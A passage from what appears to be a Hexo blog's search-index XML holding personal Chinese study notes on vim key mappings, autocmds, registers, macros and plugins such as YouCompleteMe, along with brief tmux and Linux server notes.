            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic5</title>
      <link href="/2019/08/06/linuxbasic5/"/>
      <url>/2019/08/06/linuxbasic5/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器介绍"><a href="#服务器介绍" class="headerlink" title="服务器介绍"></a>服务器介绍</h1><h2 id="服务器介绍-1"><a href="#服务器介绍-1" class="headerlink" title="服务器介绍"></a>服务器介绍</h2><ul><li>按高度计算，单位为Ｕ</li><li>刀片服务器，高可用高密度，热插拔</li><li>塔式服务器，用处较少</li><li>云服务器是未来</li></ul><h2 id="高并发服务器"><a href="#高并发服务器" class="headerlink" title="高并发服务器"></a>高并发服务器</h2><ul><li>优先把数据传入内存，速度快。缺点宕机丢数据</li><li>解决缺点方法：<ul><li>多路供电</li><li>保证供电</li></ul></li><li>高并发读写处理类似操作系统中的快表，常用的放在内存中，读取快速，不常用放硬盘</li><li>buffer（缓冲区）数据进内存</li><li>cache（缓存区）内存读数据</li></ul><h2 id="阵列卡（RAID卡）"><a href="#阵列卡（RAID卡）" class="headerlink" title="阵列卡（RAID卡）"></a>阵列卡（RAID卡）</h2><ul><li>未完后补</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux_vim</title>
      <link href="/2019/08/04/tmux-vim/"/>
      <url>/2019/08/04/tmux-vim/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><ul><li>tnew &#x3D; “tmux new -s”</li><li>基本没有说什么，之后再搜索课程进行补充</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> tmux, vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic6</title>
      <link href="/2019/08/03/vimbasic6/"/>
      <url>/2019/08/03/vimbasic6/</url>
      
        <content type="html"><![CDATA[<h1 id="vim插件"><a href="#vim插件" class="headerlink" title="vim插件"></a>vim插件</h1><h2 id="nerdtree"><a href="#nerdtree" class="headerlink" title="nerdtree"></a>nerdtree</h2><ul><li>目录插件</li><li>github搜索获取</li><li>leaderev+Plug ‘github目录’</li><li>leadersv+PlugInstall</li><li>开vim自启动,autocmd vimenter * NERDTree</li><li>开关目录快捷键设置nnoremap <leader>n :NERDTreeTOggle<CR></li><li>打开文件所在目录位置 快捷键设置为 <leader>f :NERDTreeFind<cr></li></ul><h2 id="vim-markdown插件"><a href="#vim-markdown插件" class="headerlink" title="vim-markdown插件"></a>vim-markdown插件</h2><ul><li>折叠相关<ul><li>zo打开</li><li>zc关闭</li><li>zR解开全部折叠</li></ul></li></ul><h2 id="easymotion插件"><a href="#easymotion插件" class="headerlink" title="easymotion插件"></a>easymotion插件</h2><ul><li>功能快速跳转</li><li>快捷键ss</li><li>搜索之后光标快速移动到指定位置，相较于vim本身的斜杠更好用</li><li>ss功能只能搜索到显示能看到的地方，不知道为啥，但是可以用来快速定位光标到所见未知也是不错的</li></ul><h2 id="ctrlp插件"><a href="#ctrlp插件" class="headerlink" title="ctrlp插件"></a>ctrlp插件</h2><ul><li>快捷键ctrlp模糊搜索文件</li></ul><h2 id="instant-markdown"><a href="#instant-markdown" class="headerlink" title="instant-markdown"></a>instant-markdown</h2><ul><li>这个用不了，npm安装后，配置文件中找不到要用的插件位置</li></ul><h2 id="vimsurround-更改成对出现的符号"><a href="#vimsurround-更改成对出现的符号" class="headerlink" title="vimsurround 更改成对出现的符号"></a>vimsurround 更改成对出现的符号</h2><ul><li>cs 将成对符号更改<ul><li>例 cs’” 将单引号改为双引号</li></ul></li><li>ys <ul><li>例 ysiw” 将这个单词加双引号</li></ul></li><li>ds<ul><li>例 ds”  删除双引号</li></ul></li><li>安装过程<ul><li>github搜索安装即可，同上</li></ul></li></ul><h2 id="fzf-vim模糊搜索"><a href="#fzf-vim模糊搜索" class="headerlink" title="fzf.vim模糊搜索"></a>fzf.vim模糊搜索</h2><ul><li><a href="https://github.com/junegunn/fzf.vim">fzf.vim</a> 参考官方文档的command</li><li>常用命令<ul><li>Ag[PATTERN]模糊搜索字符串,这个功能不会用！</li><li>Files[PATH]模糊搜索目录</li></ul></li></ul><h2 id="far-vim搜索替换插件"><a href="#far-vim搜索替换插件" class="headerlink" title="far.vim搜索替换插件"></a>far.vim搜索替换插件</h2><ul><li>:Far 被替换词 替换词 \**&#x2F;* <ul><li>\**表示上层目录所有文件类型</li><li>\*表示当前目录所有文件类型</li><li>回车后会生成预览文件，没问题就可以替换</li></ul></li><li>预览文件没问题需要执行Fardo命令进行替换</li></ul><h2 id="vim-go"><a href="#vim-go" class="headerlink" title="vim-go"></a>vim-go</h2><ul><li>已经预装了，所以没有装，但是这台linux上没有golang的运行环境需要自己安装</li></ul><h2 id="python-mode打造轻量级PythonIDE"><a href="#python-mode打造轻量级PythonIDE" class="headerlink" title="python-mode打造轻量级PythonIDE"></a>python-mode打造轻量级PythonIDE</h2><ul><li><p>需要注意的是安装库可能会花些时间</p></li><li><p>:help pymode 查询帮助信息,注意设置了打开文件类型，只有Python文件才可以打开插件</p></li><li><p>Support Python version 2.6+ and 3.2+</p></li><li><p>Syntax highlighting</p></li><li><p>Virtualenv support</p></li><li><p>Run python code (<leader>r)-    </p></li><li><p>Add&#x2F;remove breakpoints (<leader>b)-    </p></li><li><p>Improved Python indentation-     </p></li><li><p>Python motions and operators (]], 3[[, ]]M, vaC, viM, daC, ciM, …)-    </p></li><li><p>Improved Python folding-     </p></li><li><p>Run multiple code checkers simultaneously (:PymodeLint)-    </p></li><li><p>Autofix PEP8 errors (:PymodeLintAuto)-    </p></li><li><p>Search in python documentation (<leader>K)-    </p></li><li><p>Code refactoring-    </p></li><li><p>Intellisense code-completion-     </p></li><li><p>Go to definition (<C-c>g)-    </p></li><li><p>And more, more …- -</p></li></ul><h2 id="vim-tagbar"><a href="#vim-tagbar" class="headerlink" title="vim tagbar"></a>vim tagbar</h2><ul><li>安装前需要先安装ctag</li><li>同样的插件github安装</li><li>更改配置文件快速切换<ul><li>nnoremap <leader>tb :TagbarToggle<CR></li></ul></li></ul><h2 id="vim-interestingwords"><a href="#vim-interestingwords" class="headerlink" title="vim-interestingwords"></a>vim-interestingwords</h2><ul><li>高亮单词</li><li>找到需要高亮的单词<leader>k,全文高亮需要单词</li><li><leader>K,用于高亮需要单词</li></ul><h2 id="deoplete-nvim"><a href="#deoplete-nvim" class="headerlink" title="deoplete.nvim"></a>deoplete.nvim</h2><ul><li>实现代码补全功能</li><li><C-xo>代码补全</li></ul><h2 id="coc-vim"><a href="#coc-vim" class="headerlink" title="coc.vim"></a>coc.vim</h2><ul><li>实现代码补全未安装，但是推荐说是很好用</li></ul><h2 id="代码格式检查"><a href="#代码格式检查" class="headerlink" title="代码格式检查"></a>代码格式检查</h2><ul><li>自动格式化</li><li>静态检查</li></ul><h3 id="Neoformat"><a href="#Neoformat" class="headerlink" title="Neoformat"></a>Neoformat</h3><ul><li>这个插件有问题啊，没办法格式化，就算安装autopep8，也没办法格式化python代码</li></ul><h3 id="vim-autoformat"><a href="#vim-autoformat" class="headerlink" title="vim-autoformat"></a>vim-autoformat</h3><ul><li>相较于Neoformat这个更好用，刚开始也出现了无法使用的问题，解决方法不用pip安装autopep8，改用sudo apt install python-autopep8 </li><li>上面的Neoformat用了之后可以使用，但是有些缩进仍不规范</li></ul><h3 id="静态检查"><a href="#静态检查" class="headerlink" title="静态检查"></a>静态检查</h3><ul><li>neomake</li><li>ale<ul><li>可以参考官方文档自定义检查功能，让报的错少些</li></ul></li></ul><h2 id="快速注释"><a href="#快速注释" class="headerlink" title="快速注释"></a>快速注释</h2><ul><li>vim-commentary<ul><li>gcc使用</li><li>gcgc取消<br>  -多行也是gc注释和取消</li></ul></li></ul><h2 id="git相关插件"><a href="#git相关插件" class="headerlink" title="git相关插件"></a>git相关插件</h2><h3 id="Fugitive"><a href="#Fugitive" class="headerlink" title="Fugitive"></a>Fugitive</h3><ul><li>在vim里使用git</li></ul><h3 id="vim-gitgutter"><a href="#vim-gitgutter" class="headerlink" title="vim-gitgutter"></a>vim-gitgutter</h3><ul><li>显示git文件变动</li></ul><h3 id="gv-vim"><a href="#gv-vim" class="headerlink" title="gv.vim"></a>gv.vim</h3><ul><li>查看命令行git项目提交记录</li><li>:GV 即可打开gitbrowser</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic5</title>
      <link href="/2019/07/31/vimbasic5/"/>
      <url>/2019/07/31/vimbasic5/</url>
      
        <content type="html"><![CDATA[<h1 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h1><h2 id="noremap"><a href="#noremap" class="headerlink" title="noremap"></a>noremap</h2><ul><li>无递归配置使用<C-u> 将一个带有下划线单词改为全大写 并回到insertmode<Esc>viwU<Esc>i</li><li>通过手动配置vim比插件更容易记忆自己配置过什么，并且可以快速定位配置位置修改，注意使用noremap用于设置防止与插件冲突</li></ul><h2 id="编辑时修改vimrc"><a href="#编辑时修改vimrc" class="headerlink" title="编辑时修改vimrc"></a>编辑时修改vimrc</h2><ul><li>例子:nnoremap <leader>ev :vsplit $MYVIMRC<cr>以上代码可以通过leader键加ev实现纵向分屏打开配置文件，并直接添加某个映射到vimrc文件中, 命令中的<cr>相当于回车等同于执行命令。</li><li>之后nnoremap <leader>sv :source $MYVIMRC<cr>可以重读配置文件使刚刚的配置生效，按leader键加sv即可</li></ul><h2 id="自定义纠错"><a href="#自定义纠错" class="headerlink" title="自定义纠错"></a>自定义纠错</h2><ul><li>:iabbrev mlfalcon lmfalcon  将错误的拼写改为正确的拼写</li><li>可以在insert，command，replace 三个模式下生效</li><li>inoremap 会在任意时候更换错误拼写，而iabbrev 只会在前后字符非字母时进行替换</li></ul><h2 id="localleader-or-leader"><a href="#localleader-or-leader" class="headerlink" title="localleader or leader"></a>localleader or leader</h2><ul><li>localleader更适合做插件给他人使用的时候设置，这样具有更好的可移植性</li><li>leader自己使用时设置就好了，这样自己可以熟悉使用leader按键。</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><buffer></h2><ul><li>nnoremap <buffer> <leader>x dd这个设置只会在进行这个设置文件中生效其他文件不会拥有这个缓冲区，所以不会生效</li><li>localleader 可以使用特定缓冲区</li><li>如果在一个文件的缓冲区设置了相同按键的两个指令一个有<buffer>另一个没有，结果只会执行有<buffer>的指令</li></ul><h2 id="setlocal"><a href="#setlocal" class="headerlink" title="setlocal"></a>setlocal</h2><ul><li>这个命令只会在当前的文件生效</li><li>例如:setlocal nowrap 只会在当前文件不折叠</li></ul><h2 id="autocmd"><a href="#autocmd" class="headerlink" title="autocmd"></a>autocmd</h2><ul><li>如果建立一个文件后未保存退出，vim默认不会帮你创建文件</li><li>修改方法 autocmd BufNewFile * :write 自动命令会自动执行，bufNewFile是创建新文件，*是任意文件名的通配符，：write 是写入保存。这个命令会在你创建文件时执行并保存</li><li>autocmd BufWritePre *.html :normal gg&#x3D;G 可以将BufWritePre 将在保存任何字符前触发:normal gg&#x3D;G 将html文件的格式改为和第一行的相同，即所有行都没有缩进</li><li>autocmd BufNewFile,BufRead *.html setlocal nowrap 这个命令的作用是将编辑html文件的换行取消。</li><li>autocmd FileType javascript nnoremap <buffer> <localleader>c I&#x2F;&#x2F;<Esc> 在处理javascript文件时将用localleader加ｃ注释掉当前光标所在行</li><li>autocmd FileType Python nnoremap <buffer> <localleader>c I#<Esc>作用类似上面的注释方法</li></ul><h3 id="自动命令和缩写"><a href="#自动命令和缩写" class="headerlink" title="自动命令和缩写"></a>自动命令和缩写</h3><ul><li>自动命令搭配纠错可以通过缩写实现自动补全</li><li>例： autocmd FileType javascript :iabbrev <buffer> iff if:<left>autocmd FileType Python :iabbrev <buffer> iff if()<left>这样就通过iff实现了自动补全功能</li></ul><h3 id="自动执行组"><a href="#自动执行组" class="headerlink" title="自动执行组"></a>自动执行组</h3><ol><li>:augroup testgroup</li><li>:autocmd BufWrite * :echom “Foo”</li><li>:autocmd BufWrite * :echom “Bar”</li><li>:augroup END</li></ol><ul><li>顺序执行完上面步骤保存会打印Foo,但是不会打印Bar.如果继续在相同的组添加指令Bar也会出现，但是新指令不出现。</li><li>在组中添加:autocmd!后可以清楚之前创建的所有指令，但是这条指令后添加其他指令，其他的指令依然会执行，说明组仍存在未完全清除。只有单独添加:autocmd!才会清除整个组</li></ul><h2 id="Operator-Pending映射"><a href="#Operator-Pending映射" class="headerlink" title="Operator-Pending映射"></a>Operator-Pending映射</h2><ul><li>在normalmode下使用</li><li>Operator 是操作<ul><li>d 删除</li><li>c （change)修改</li><li>y 复制</li></ul></li><li>Movement 是移动范围<ul><li>w到下一个单词 </li><li>i(i&#x3D;&#x3D;inside，在括号内 </li><li>in(移动到下一个(n&#x3D;&#x3D;nex)t的括号内</li><li>il(移动到上一个括号内，l&#x3D;&#x3D;last</li><li>t,到逗号</li><li>F)向后移动到最近的）字符</li><li>vi(进入可视模式选中括号内的所有内容</li></ul></li><li>可以组合上面的O-M语句实验效果</li></ul><h3 id="Movement-映射修改创建"><a href="#Movement-映射修改创建" class="headerlink" title="Movement 映射修改创建"></a>Movement 映射修改创建</h3><ul><li>:onoremap p i( 将p改为进入括号中，normalmode中使用dp即可将括号内的语句删除</li><li>:onoremap 自定义按键 &#x2F;希望搜索的字符</li><li></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimplug</title>
      <link href="/2019/07/30/vimplug/"/>
      <url>/2019/07/30/vimplug/</url>
      
        <content type="html"><![CDATA[<h1 id="vim插件"><a href="#vim插件" class="headerlink" title="vim插件"></a>vim插件</h1><h2 id="vim的插件管理工具vim-plug"><a href="#vim的插件管理工具vim-plug" class="headerlink" title="vim的插件管理工具vim-plug"></a>vim的插件管理工具vim-plug</h2><ul><li>github上搜索可找到安装</li><li>安装后github上还有具体的配置方法</li><li>修改好.vimrc后即可使用</li><li>添加插件plug ‘插件名称’</li><li>保存配置文件,:source .vim&#x2F;vimrc使用配置</li><li>保存配置文件后还是要重启vim编辑器才能安装插件</li><li>:PlugInstall 安装插件，等待安装完成重启</li></ul><h2 id="vim插件搜索方法"><a href="#vim插件搜索方法" class="headerlink" title="vim插件搜索方法"></a>vim插件搜索方法</h2><ul><li>Google</li><li><a href="https://vimawesome.com/">https://vimawesome.com/</a></li><li>网上搜索别人的开源配置借鉴别人的插件</li></ul><h2 id="YouCompleteMe"><a href="#YouCompleteMe" class="headerlink" title="YouCompleteMe"></a>YouCompleteMe</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li>vim-plug安装<ul><li>之前安装好github上需求的cmake和python支持</li><li>Plug’&#x2F;ycm-core&#x2F;YouCompleteMe’ </li><li>PlugInstall等待，建议提前安装阿里的镜像goproxy，否则会安装失败。安装失败要到下面的目录删除文件夹重新安装</li><li>cd ~&#x2F;.vim&#x2F;plugged&#x2F;YouCompleteMe&#x2F;</li><li>python3 install.py –clang-completer</li><li>安装完成，但是仍不能补全c</li><li>以下是添加c的补全支持方法，由于插件管理器我用的是vim-plug所以应该全部替换为上方的地址</li><li>下方引用blog地址为<a href="https://www.cnblogs.com/alinh/p/6699789.html">引用的blog</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">7、接着再次打开 .vimrc 配置YCM，添加内容如下：</span><br><span class="line"></span><br><span class="line">filetype off                  &quot; required!</span><br><span class="line">set rtp+=~/.vim/bundle/vundle/</span><br><span class="line">call vundle#rc()</span><br><span class="line">Plugin &#x27;Valloric/YouCompleteMe&#x27;</span><br><span class="line">filetype plugin indent on     &quot; required!</span><br><span class="line">let g:ycm_global_ycm_extra_conf=&#x27;~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&#x27;</span><br><span class="line"></span><br><span class="line">　　注：</span><br><span class="line">8、为了补全，我们还需要在 .ycm_extra_conf.py 文件中进行配置，vim ~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py；添加信息如下：</span><br><span class="line"></span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include&#x27;,</span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include/c++/4.8.4&#x27;,</span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include/c++/4.9.2&#x27;,</span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include&#x27;,</span><br><span class="line">&#x27;/usr/include/x86_64-linux-gnu/c++&#x27;,</span><br><span class="line"></span><br><span class="line">　　实际上以上是vim自动补全时搜索路径，如果自动补全的内容位于/usr/local/include里面，则添加以下信息：</span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/local/include&#x27;,</span><br><span class="line"></span><br><span class="line">　　根据实际的/usr/include/c++/中的文件夹名称(即C++版本号)修改：</span><br><span class="line"></span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include/c++/4.8.4&#x27;,</span><br><span class="line">&#x27;-isystem&#x27;,</span><br><span class="line">&#x27;/usr/include/c++/4.9.2&#x27;,</span><br></pre></td></tr></table></figure></li></ul></li><li>发现markdown内仍不能使用这个插件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;vimrc增加以下配置（把markdown从中移除了）</span><br><span class="line">let g:ycm_filetype_blacklist = &#123;</span><br><span class="line">        \ &#x27;tagbar&#x27;: 1,</span><br><span class="line">        \ &#x27;notes&#x27;: 1,</span><br><span class="line">        \ &#x27;netrw&#x27;: 1,</span><br><span class="line">        \ &#x27;unite&#x27;: 1,</span><br><span class="line">        \ &#x27;text&#x27;: 1,</span><br><span class="line">        \ &#x27;vimwiki&#x27;: 1,</span><br><span class="line">        \ &#x27;pandoc&#x27;: 1,</span><br><span class="line">        \ &#x27;infolog&#x27;: 1,</span><br><span class="line">        \ &#x27;mail&#x27;: 1</span><br><span class="line">        \&#125;</span><br></pre></td></tr></table></figure></li><li>发现markdown中仍不能补全其他语言的代码。查youcompleteme需要在.md文件用vim查看时输入:set ft&#x3D;你想不全的语言的后缀（ft&#x3D;filetype),保存也不会改变后缀，所以放心改咯！</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim, vimplug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic4</title>
      <link href="/2019/07/29/vimbasic4/"/>
      <url>/2019/07/29/vimbasic4/</url>
      
        <content type="html"><![CDATA[<h1 id="vim补全"><a href="#vim补全" class="headerlink" title="vim补全"></a>vim补全</h1><h2 id="单词补全"><a href="#单词补全" class="headerlink" title="单词补全"></a>单词补全</h2><ul><li>ctrl + n 和ctrl + p 补全单词</li></ul><h2 id="路径补全"><a href="#路径补全" class="headerlink" title="路径补全"></a>路径补全</h2><ul><li>ctrl + x 和 ctrl + f 补全文件名</li></ul><h2 id="代码补全，需插件识别代码"><a href="#代码补全，需插件识别代码" class="headerlink" title="代码补全，需插件识别代码"></a>代码补全，需插件识别代码</h2><ul><li>ctrl + x 和 ctrl + o 补全代码，需要开启文件类型检查，安装插件</li></ul><h1 id="vim配色更改"><a href="#vim配色更改" class="headerlink" title="vim配色更改"></a>vim配色更改</h1><ul><li>查询当前配色colorscheme</li><li>可用的所有配色 colorscheme <C-d></li><li>colorscheme 加配色名修改配色</li><li>github中搜索colorscheme即可找到合适配色方案安装即可</li></ul><h1 id="裸vim学习"><a href="#裸vim学习" class="headerlink" title="裸vim学习"></a>裸vim学习</h1><ul><li>直接适应裸vim的操作之后不管是在其他IDE中使用VIM都会很方便</li><li>练习盲打很重要，形成肌肉记忆，快速适应新的编辑器用法</li><li>既然能存在这么多年说明vim肯定有他的优势熟练使用会在linux系统熟练操作上有很多好处</li><li>键盘既然已经改了按键这样一定要尽快适应按键的位置，例如更改esc和caps的位置要尽快熟练这两个位置的更换，加快vim各种模式的切换</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic3</title>
      <link href="/2019/07/28/vimbasic3/"/>
      <url>/2019/07/28/vimbasic3/</url>
      
        <content type="html"><![CDATA[<h1 id="vim基本用法3"><a href="#vim基本用法3" class="headerlink" title="vim基本用法3"></a>vim基本用法3</h1><h2 id="文本操作"><a href="#文本操作" class="headerlink" title="文本操作"></a>文本操作</h2><ul><li>[number]<command>[text object]<ul><li>number 次数</li><li>command 命令，d(elete),c(hange),y(ank)</li><li>text object 文本对象，单词w，句子s,段落p</li></ul></li><li>vaw 改变括号，引号等被包裹起来的所有词包括空格</li><li>viw 改变包裹起来的所有词不包括结尾的空格</li></ul><h2 id="复制粘贴"><a href="#复制粘贴" class="headerlink" title="复制粘贴"></a>复制粘贴</h2><ul><li>设置了autoindent，可能导致代码缩进错乱<ul><li>解决方式用:set paste和:set nopaste</li><li>可以用插件直接解决</li></ul></li><li>使用xp可以快速调换两个字符</li></ul><h3 id="vim使用无名寄存器用于保存复制内容"><a href="#vim使用无名寄存器用于保存复制内容" class="headerlink" title="vim使用无名寄存器用于保存复制内容"></a>vim使用无名寄存器用于保存复制内容</h3><ul><li>“指定寄存器名，不指定为默认的无名寄存器</li><li>“ayiw 复制一个单词到寄存器a中，”bdd 删除当前行到b寄存器中</li><li>“”表示无名寄存器</li></ul><h3 id="各类寄存器"><a href="#各类寄存器" class="headerlink" title="各类寄存器"></a>各类寄存器</h3><ul><li>“0 复制专用寄存器</li><li>“+ 复制到系统剪贴板</li><li>:echo has(‘clipboard’)查看是否有这个，1表示有，0表示无</li><li>貌似直接<c-sh-v>可以复制系统剪贴版的内容到vim中即使是python文件也没有问题</li><li></li></ul><h2 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h2><ul><li>q 用于录制和退出</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ul><li>将下面的操作全部变成列表</li><li>用qa命令开始录制并将录制结果保存在a寄存器中</li><li>成功后出现recording @a </li><li>按i进入插入模式</li><li>输入-加空格</li><li>此时结束录制，底端的recording @a也会消失</li><li>按V行选择</li><li>按G直接选择至尾行</li><li>按:发现左下角出现’&lt;,’&gt;</li><li>输入normal @a</li><li>完成列表</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxbasic4</title>
      <link href="/2019/07/27/linuxbasic4/"/>
      <url>/2019/07/27/linuxbasic4/</url>
      
        <content type="html"><![CDATA[<h1 id="linux-命令"><a href="#linux-命令" class="headerlink" title="linux 命令"></a>linux 命令</h1><ul><li>evince PDF文档名 阅读PDF文档</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic2</title>
      <link href="/2019/07/27/vimbasic2/"/>
      <url>/2019/07/27/vimbasic2/</url>
      
        <content type="html"><![CDATA[<h1 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h1><h2 id="vimrc配置文件更改"><a href="#vimrc配置文件更改" class="headerlink" title=".vimrc配置文件更改"></a>.vimrc配置文件更改</h2><ul><li>map 按键1 按键2 </li><li>特殊按键要<space>，组合键<C-d></li><li>对应三个模式下的映射(不推荐)<ul><li>nmap normal</li><li>imap insert</li><li>vmap visual</li></ul></li><li>上种映射存在冲突可能，以下方式较好<ul><li>nnoremap</li><li>inoremap</li><li>vnoremap</li></ul></li><li>“ 表示注释，配置最好做好注释防止忘记对应功能</li><li>设置leader键<ul><li>let mapleader &#x3D; “,” 常用逗号或者空格</li></ul></li><li>noremap 按键1 按键2将按键一改为按键二</li><li>map S :w<CR>将大写S改为一键保存,CR表示Command模式</li><li>map Q :q<CR>将大写Q改为一键退出</li><li>map R :source $MYVIMRC<CR> 一键修改设置</li><li>syntax on语法高亮 </li><li>set number or nonuber更改是否显示行号</li><li>set norelativenumberor relativenuber 更改行号是否关联</li><li>map s <nop> 取消s按键在命令模式下替换功能</li><li>set cursorline下划线显示所编辑行</li><li>set wrap</li><li>set showcmd</li><li>set wildmenu自动补全命令</li><li>set pastetoggle&#x3D;<F2> F2进入粘贴模式</li><li>set hlsearch设置高亮搜索</li><li>set foldmethod&#x3D;indent设置折叠方式</li><li>“一些方便的映射<ul><li>let mapleader&#x3D;’,’</li><li>let g:mapleader&#x3D; ‘,’</li></ul></li><li>inoremap jj <Esc>&#96;^使用jj进入normal模式</li><li>“使用leader+ w 直接保存（感觉还是大写S好用，但是vim中w是保存为了养成习惯一定要强迫自己使用leader键加w来保存）<ul><li>inoremap <leader>w <Esc>:w<cr></li><li>noremap <leader>w :w<cr></li></ul></li><li>“切换buffer<ul><li>nnoremap <silent> [b :bprevious<CR></li><li>nnoremap <silent> [n :bnext<CR><br>-“use ctrl+hjkl switch window</li><li>noremap <C-h> <C-w>h</li><li>noremap <C-j> <C-w>j</li><li>noremap <C-k> <C-w>k</li><li>noremap <C-l> <C-w>l</li></ul></li><li>“使用:h option-list 来看配置的各个符号具体功能</li><li>“sudo to write<ul><li>cnoremap w!! w !sudo tee % &gt;&#x2F;dev&#x2F;null</li></ul></li><li>“ json 格式化<ul><li>com! FormatJSON %!python3 -m json.tool</li></ul></li><li>笨方法学Vimscript 百度搜索电子书来看，里面有详细的配置方法</li></ul><h2 id="分屏设置"><a href="#分屏设置" class="headerlink" title="分屏设置"></a>分屏设置</h2><ul><li><c-w> 用于分屏<C-w>表示Ctrl + w,不能直接分屏，只用于切换</li><li><c-w>w 用于分屏间的切换</li><li><c-w>l 用于分屏间互换位置</li><li><c-w>&#x3D; 用于分屏,所有窗口等高</li><li><c-w>_ 用于分屏,当前窗口最大化活动高度</li><li>[N]<c-w> 用于分屏,高度设为N</li><li>[N]<c-w>l 用于分屏,纵向高度设为N</li><li>:sp 横向分屏</li><li>:vs 纵向分屏</li></ul><h2 id="标签页设置"><a href="#标签页设置" class="headerlink" title="标签页设置"></a>标签页设置</h2><ul><li>:h tabpage了解tap的相关用法，相当于设置工作区，全部用于存储同一文件类型</li><li>:tabnew 用于打开新的工作区</li><li>gt 用于不同的工作区之间的切换</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vimbasic1</title>
      <link href="/2019/07/26/vimbasic1/"/>
      <url>/2019/07/26/vimbasic1/</url>
      
        <content type="html"><![CDATA[<h1 id="vim基本操作"><a href="#vim基本操作" class="headerlink" title="vim基本操作"></a>vim基本操作</h1><hr><h2 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h2><ul><li>I 在行首并开始插入模式</li><li>A 在行尾并开始插入模式</li><li>O 在上一行并开始插入模式 </li><li>o 在下一行并开始插入模式</li></ul><hr><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><ul><li>H 光标回到文章开头</li><li>L 光标回到文章末尾</li><li>ctrl + s 在bash中是锁屏快捷键，vim中无法使用</li><li>Ctrl + q 在bash中可以解锁屏</li><li>ctrl + { 上一段</li><li>Ctrl + } 下一段</li><li>gg 为移动至开头</li><li>numG num表示移动的行号</li><li>G 为移动到行尾</li><li>dd 为删除所在行</li><li>num dd 为删除num行</li><li>d0 删除光标前本行所有内容</li><li>D 删除光标后本行所有内容，包含光标位置字符</li><li>dw 删除光标所在单词</li><li>x 删除光标所在字符</li><li>X 删除光标前字符</li><li>u 撤销操作</li><li>ctrl + r 反撤销（重做）</li><li>. 重复上一次指令</li><li><blockquote><blockquote><p>文本行右移动</p></blockquote></blockquote></li><li>&lt;&lt; 文本行左移动</li><li>yy 复制本行</li><li>nyy 复制n行</li><li>p 粘贴</li><li>r 替换当前字符</li><li>R 替换模式，替换光标字符直到esc</li></ul><hr><h2 id="末行模式"><a href="#末行模式" class="headerlink" title="末行模式"></a>末行模式</h2><ul><li>: 进入末行模式</li><li>&#x2F; + 查找内容<ul><li>n 查找下一个</li><li>N 查找上一个</li></ul></li><li>:[range]s&#x2F;{pattern}&#x2F;{string}&#x2F;{flags}<ul><li>flags<ul><li>g 全局替换</li><li>c 确认提换</li><li>n 匹配到的次数</li></ul></li></ul><p></p></li><li>%s&#x2F;abc&#x2F;123&#x2F;g 文本中所有abc替换为123，不加g只替换首个</li><li>1,10s&#x2F;abc&#x2F;123&#x2F;g 